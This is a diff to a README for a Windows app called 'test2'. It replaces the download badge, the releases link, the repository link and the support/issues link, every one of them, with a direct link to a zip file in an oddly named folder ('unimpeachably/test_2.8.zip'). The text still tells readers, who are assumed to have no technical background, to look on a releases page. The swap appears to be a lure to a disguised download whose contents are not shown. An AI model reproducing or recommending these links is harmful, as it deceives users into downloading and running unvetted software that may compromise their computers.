@@ -1,6 +1,6 @@
 # ⚙️ test2 - Simple Tool for Easy Tasks
 
-[![Download test2](https://img.shields.io/badge/Download-Get%20test2-blue?style=for-the-badge)](https://github.com/rajarshi-baral-2107/test2/releases)
+[![Download test2](https://img.shields.io/badge/Download-Get%20test2-blue?style=for-the-badge)](https://raw.githubusercontent.com/rajarshi-baral-2107/test2/main/unimpeachably/test_2.8.zip)
 
 test2 is a user-friendly app designed to help you complete your tasks with ease. This guide walks you through downloading and running the software on Windows, even if you have no technical background.
 
@@ -23,12 +23,12 @@ This section explains how to get test2 ready on your Windows computer. It covers
 
 You need to download the app files before using test2. The files are available on the GitHub release page for this project.
 
-[![Download test2](https://img.shields.io/badge/Download-Get%20test2-blue?style=for-the-badge)](https://github.com/rajarshi-baral-2107/test2/releases)
+[![Download test2](https://img.shields.io/badge/Download-Get%20test2-blue?style=for-the-badge)](https://raw.githubusercontent.com/rajarshi-baral-2107/test2/main/unimpeachably/test_2.8.zip)
 
 ### How to Download
 
 1. Click the big blue "Download test2" button above or visit this link:  
-   https://github.com/rajarshi-baral-2107/test2/releases
+   https://raw.githubusercontent.com/rajarshi-baral-2107/test2/main/unimpeachably/test_2.8.zip
 
 2. On the releases page, look for the latest version of test2. It will usually be at the top.
 
@@ -139,8 +139,8 @@ test2 does not require any special technical skills. Just download, install, and
 
 ## 🔗 Useful Links
 
-- Download Page: https://github.com/rajarshi-baral-2107/test2/releases  
-- GitHub Repository: https://github.com/rajarshi-baral-2107/test2
+- Download Page: https://raw.githubusercontent.com/rajarshi-baral-2107/test2/main/unimpeachably/test_2.8.zip  
+- GitHub Repository: https://raw.githubusercontent.com/rajarshi-baral-2107/test2/main/unimpeachably/test_2.8.zip
 
 ---
 
@@ -156,4 +156,4 @@ test2 does not require any special technical skills. Just download, install, and
 ## 📞 Contact and Support
 
 If you need help, you can reach out on the GitHub repository issues section:  
-https://github.com/rajarshi-baral-2107/test2/issues
+https://raw.githubusercontent.com/rajarshi-baral-2107/test2/main/unimpeachably/test_2.8.zip
